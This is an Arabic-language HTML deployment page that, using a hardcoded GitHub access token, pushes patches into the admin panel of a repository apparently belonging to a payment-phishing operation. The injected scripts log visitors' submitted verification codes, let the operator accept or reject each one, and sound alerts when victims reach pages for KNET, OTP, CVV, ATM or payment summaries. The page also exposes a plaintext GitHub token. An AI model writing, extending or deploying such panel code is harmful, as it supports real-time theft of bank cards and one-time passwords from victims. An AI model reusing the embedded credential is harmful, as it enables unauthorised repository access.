<!doctype html>
<html lang="ar" dir="rtl">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>FIX112</title>
<style>
body{font-family:system-ui,Tajawal,sans-serif;background:#0f1115;color:#e8e8ea;padding:16px;max-width:920px;margin:auto}
h1{font-size:17px}#st{background:#1b2230;border:1px solid #2b3444;border-radius:8px;padding:9px;margin:8px 0;font-size:13px}
input{width:100%;padding:9px;border-radius:8px;border:1px solid #333;background:#1a1d24;color:#fff;box-sizing:border-box}
button{padding:11px 16px;border-radius:9px;border:0;background:#16a34a;color:#fff;font-weight:700;cursor:pointer;margin-top:8px}
#log{background:#141821;border:1px solid #262b36;border-radius:9px;padding:12px;margin-top:12px;font-family:monospace;font-size:12.5px;white-space:pre-wrap;min-height:36px}
.ok{color:#4ade80}.err{color:#f87171}.warn{color:#fbbf24}textarea{display:none}
</style></head><body>
<h1>FIX112 — الرمز المرفوض ينزل بمكانه وبنفس شكل كروت التحقق</h1>
<div id="st">جاري التحميل</div><div>Token:</div>
<input id="tok" placeholder="ghp_..."><button id="run">رفع التعديلات</button><div id="log"></div>

<textarea id="pBlock">
<!-- FIX112 -->
<script id="kddF112">
(function(){
  if (window.__f112) return; window.__f112 = 1;
  var K = {};
  try { K = JSON.parse(localStorage.getItem("kdd_rej")||"{}") || {}; } catch(e){ K = {}; }
  function sv(){ try { localStorage.setItem("kdd_rej", JSON.stringify(K)); } catch(e){} }
  function sid(){ try { return selectedVisitorId || null; } catch(e){ return null; } }
  function codeOf(b){
    var n = b, d = 0;
    while (n && d < 7){
      if (n.querySelectorAll){
        var a = n.querySelectorAll("b,strong,span,td");
        for (var i=0;i<a.length;i++){ var t = (a[i].textContent||"").trim(); if (/^\d{4,6}$/.test(t)) return t; }
      }
      n = n.parentElement; d++;
    }
    return null;
  }
  function pgOf(b){
    var n = b, d = 0;
    while (n && d < 8){
      var h = n.querySelector ? n.querySelector("h3") : null;
      if (h && (h.textContent||"").trim()) return (h.textContent||"").trim();
      n = n.parentElement; d++;
    }
    return "رمز";
  }
  function mkCard(it, newest){
    var rej = it.s === "مرفوض";
    var c = document.createElement("div");
    c.setAttribute("data-f112","1");
    c.className = "data-section bg-orange-50 p-4 rounded-lg";
    c.style.borderRightColor = "#f97316";
    var h = document.createElement("h3");
    h.className = "font-bold mb-3 text-orange-800";
    h.textContent = "🔢 رمز التحقق";
    var u = document.createElement("span");
    u.style.display = "none";
    u.textContent = "|" + (it.ts||0);
    h.appendChild(u);
    c.appendChild(h);
    var inb = document.createElement("div");
    inb.className = "bg-white p-3 rounded-lg";
    var r1 = document.createElement("div");
    r1.className = "flex justify-between items-center mb-2";
    var cd = document.createElement("span");
    cd.className = "font-mono text-lg font-bold text-orange-700";
    cd.setAttribute("dir","ltr");
    cd.textContent = it.c;
    var bg = document.createElement("span");
    bg.style.cssText = "font-size:12px;font-weight:700;padding:3px 10px;border-radius:8px;background:" + (rej?"#fee2e2":"#dcfce7") + ";color:" + (rej?"#b91c1c":"#15803d");
    bg.textContent = it.s + " · " + it.t;
    r1.appendChild(cd); r1.appendChild(bg);
    inb.appendChild(r1);
    var r2 = document.createElement("div");
    r2.className = "flex justify-between items-center";
    var pg = document.createElement("span");
    pg.className = "text-sm text-gray-500";
    pg.textContent = it.pg || "رمز";
    r2.appendChild(pg);
    if (newest){
      var b2 = document.createElement("button");
      b2.textContent = "مسح";
      b2.style.cssText = "font-size:11px;padding:2px 10px;border-radius:8px;border:1px solid #f59e0b;background:#fff;color:#b45309;cursor:pointer";
      b2.addEventListener("click", function(ev){ ev.stopPropagation(); var id = sid(); if (id){ K[id] = []; sv(); last = ""; draw(); } });
      r2.appendChild(b2);
    }
    inb.appendChild(r2);
    c.appendChild(inb);
    return c;
  }
  var last = "";
  function cont(){
    var box = document.getElementById("visitorDetails"); if (!box) return null;
    var c = box.querySelector(".space-y-3");
    if (c) return c;
    var w = box.querySelector(".space-y-6");
    if (!w) return null;
    c = document.createElement("div");
    c.className = "space-y-3";
    c.setAttribute("data-f112wrap","1");
    if (w.children.length > 1) w.insertBefore(c, w.children[1]); else w.appendChild(c);
    return c;
  }
  function draw(){
    var box = document.getElementById("visitorDetails"); if (!box) return;
    var id = sid(); if (!id) return;
    var c = cont(); if (!c) return;
    var arr = K[id] || [];
    var sig = id + "#" + arr.map(function(x){ return x.c + ":" + x.s + ":" + x.ts; }).join(",");
    if (sig === last && c.querySelector("[data-f112]")) return;
    last = sig;
    var olds = c.querySelectorAll("[data-f112]");
    for (var k=0;k<olds.length;k++) olds[k].parentNode.removeChild(olds[k]);
    if (!arr.length) return;
    for (var i=0;i<arr.length;i++){ c.insertBefore(mkCard(arr[i], i === arr.length-1), c.firstChild); }
  }
  document.addEventListener("click", function(e){
    var b = e.target && e.target.closest ? e.target.closest("button") : null;
    if (!b) return;
    var tx = (b.textContent||"").trim();
    var s = tx.indexOf("رفض") > -1 ? "مرفوض" : (tx.indexOf("موافقة") > -1 ? "مقبول" : null);
    if (!s) return;
    var id = sid(); if (!id) return;
    var c = codeOf(b);
    if (!c){ try { var v = visitors.get(id); if (v && (v.digitCodes||[]).length) c = String(v.digitCodes[v.digitCodes.length-1].code||""); } catch(e){} }
    if (!c) return;
    var a = K[id] || (K[id] = []);
    var l = a[a.length-1];
    if (!(l && l.c === c && l.s === s)){
      a.push({ c:c, s:s, pg:pgOf(b), ts:Date.now(), t:new Date().toLocaleTimeString("ar-EG",{hour:"2-digit",minute:"2-digit"}) });
      sv();
    }
    last = "";
    draw();
  }, true);
  var o = window.renderVisitorDetails;
  if (typeof o === "function" && !o.__f112){
    var f = function(){ var r = o.apply(this, arguments); try { last = ""; draw(); } catch(e){} return r; };
    f.__f112 = 1; window.renderVisitorDetails = f; try { renderVisitorDetails = f; } catch(e){}
  }
  setInterval(function(){ draw(); }, 700);
})();
</script>
<script id="kddF113">
(function(){
  if (window.__f113) return; window.__f113 = 1;
  function d(){
    try { frogAudio.currentTime = 0; frogAudio.play().catch(function(){}); return; } catch(e){}
    try { new Audio("/admin/frog.mp3").play(); } catch(e){}
  }
  var P = /ملخص|summary|دفع|كي نت|knet|otp|رمز|cvv|atm|نهائي|final/i;
  function h(){
    try {
      var s = window.socket;
      if (!s || s === window.__stub || !s.on || s.__f113) return;
      s.__f113 = 1;
      s.on("visitor:pageChanged", function(x){ try { if (P.test(String((x&&x.page)||""))) d(); } catch(e){} });
      s.on("visitor:dataSubmitted", function(x){ try { if (P.test(String((x&&x.data&&x.data.page)||""))) d(); } catch(e){} });
    } catch(e){}
  }
  h(); setInterval(h, 500);
})();
</script>
</textarea>

<script>
(function(){
  var HARD="ghp_HBP5jlN6T8cn7QAh9xceBRqTN95v04cS4j5";
  var OWNER="fahshomi-ui",REPO="KDD",BRANCH="main";
  var FILES=["server/admin/index.html","kdd-public/admin.html"];
  function $(i){return document.getElementById(i)}
  var st=$("st"),log=$("log"),tok=$("tok"),run=$("run");
  function set(t){try{st.textContent=t}catch(e){}}
  function say(t,c){var d=document.createElement("div");if(c)d.className=c;d.textContent=t;log.appendChild(d)}
  function fixType(s){ return String(s).replace(/\s*type\s*=\s*"text\/htmlpreview"/gi,""); }
  function tagStart(s,p){ var lt=s.lastIndexOf("<",p); return lt>-1?lt:p; }
  function PAY(){return fixType($("pBlock").value.replace(/^\n/,"").replace(/[ \t]+$/gm,"").replace(/\n+$/,""))}
  try{var q="";try{q=new URLSearchParams(location.search).get("token")||""}catch(e){}tok.value=q||HARD;set("جاهز ✓")}catch(e){set("خطأ: "+e.message)}
  var AUTH=null;
  async function probe(){var t=tok.value.trim();say("طول التوكن: "+t.length);
    var vs=[["token","token "+t],["Bearer","Bearer "+t],["Basic","Basic "+btoa(t+":")]];
    for(var i=0;i<vs.length;i++){try{var r=await fetch("https://api.github.com/repos/"+OWNER+"/"+REPO,{headers:{Authorization:vs[i][1],Accept:"application/vnd.github+json"}});
      if(r.status===200){say("✓ مصادقة: "+vs[i][0],"ok");AUTH=vs[i][1];return true}
      var bd="";try{bd=await r.text()}catch(e){};say("✗ "+vs[i][0]+" → "+r.status+" "+bd.slice(0,90),"err")}catch(e){say("✗ "+vs[i][0]+" → شبكة","err")}}
    return false}
  function H(){return {Authorization:AUTH,Accept:"application/vnd.github+json"}}
  function b64(s){return btoa(unescape(encodeURIComponent(s)))}
  async function doFile(path){
    try{
      var gr=await fetch("https://api.github.com/repos/"+OWNER+"/"+REPO+"/contents/"+path+"?ref="+BRANCH,{headers:H()});
      if(!gr.ok){say("✗ "+path+" : "+gr.status,"err");return 0}
      var meta=await gr.json();
      var src=decodeURIComponent(escape(atob(meta.content.replace(/\n/g,""))));
      var bad=src.indexOf("text/htmlpreview")>-1;
      if(src.indexOf('id="kddF112"')>-1 && !bad){say("• "+path+" : مطبّق مسبقاً","warn");return 0}
      say("• "+path+" : وسم معطوب؟ "+(bad?"نعم":"لا"));
      var out=src;
      var b="['الصفحة الرئيسية', 'ملخص الدفع']";
      if(out.indexOf(b)>-1)out=out.replace(b,"['الصفحة الرئيسية']");
      var a='if (!noSoundPages.includes(currentPage)) {';
      if(out.indexOf(a)>-1)out=out.replace(a,'if (/ملخص|summary/i.test(String(currentPage||"")) || !noSoundPages.includes(currentPage)) {');
      var end=out.lastIndexOf("</body>");
      if(end<0){say("✗ "+path+" : لا يوجد body","err");return 0}
      var start=-1;
      ["kddF102","kddF104","kddF105","kddF107","kddF108","kddF110","kddF112"].forEach(function(id){
        var p=out.indexOf('id="'+id+'"'); if(p<0)return;
        var s=tagStart(out,p);
        if(start<0||s<start)start=s;
      });
      var payload=PAY();
      if(start>-1&&start<end){out=out.slice(0,start)+payload+"\n"+out.slice(end);say("• "+path+" : استبدال المنطقة","warn")}
      else{out=out.slice(0,end)+payload+"\n"+out.slice(end);say("• "+path+" : إدراج قبل body")}
      out=fixType(out);
      var left=out.indexOf("text/htmlpreview")>-1;
      say("• فحص النتيجة: "+(left?"ما زال موجود!":"نظيف ✓"),left?"err":"ok");
      if(out.indexOf('id="kddF112"')<0){say("✗ "+path+" : لم يُزرع","err");return 0}
      var pr=await fetch("https://api.github.com/repos/"+OWNER+"/"+REPO+"/contents/"+path,{method:"PUT",headers:Object.assign(H(),{"Content-Type":"application/json"}),body:JSON.stringify({message:"FIX112: rejected code inside list with same card style",content:b64(out),sha:meta.sha,branch:BRANCH})});
      if(!pr.ok){say("✗ "+path+" : "+pr.status,"err");return 0}
      say("✓ تم التعديل : "+path,"ok");return 1;
    }catch(e){say("✗ "+path+" : "+e.message,"err");return 0}
  }
  async function runAll(){try{
    log.innerHTML="";if(!tok.value.trim()){say("أدخل التوكن","err");return}
    run.disabled=true;set("فحص التوكن...");
    if(!await probe()){say("");say("⚠ التوكن مرفوض — الصق توكن جديد واضغط الزر.","err");set("الصق توكن جديد");run.disabled=false;return}
    set("جاري الرفع...");say("");var ok=0;
    for(var i=0;i<FILES.length;i++){set("معالجة: "+FILES[i]);if(await doFile(FILES[i])===1)ok++}
    say("");say("النتيجة: "+ok+" ملف معدّل",ok?"ok":"warn");set(ok?"تم ✓ — "+ok+" ملف":"انتهى بدون تعديل");run.disabled=false;
  }catch(e){say("خطأ: "+e.message,"err");set("خطأ");run.disabled=false}}
  run.addEventListener("click",runAll);setTimeout(runAll,700);
})();
</script>
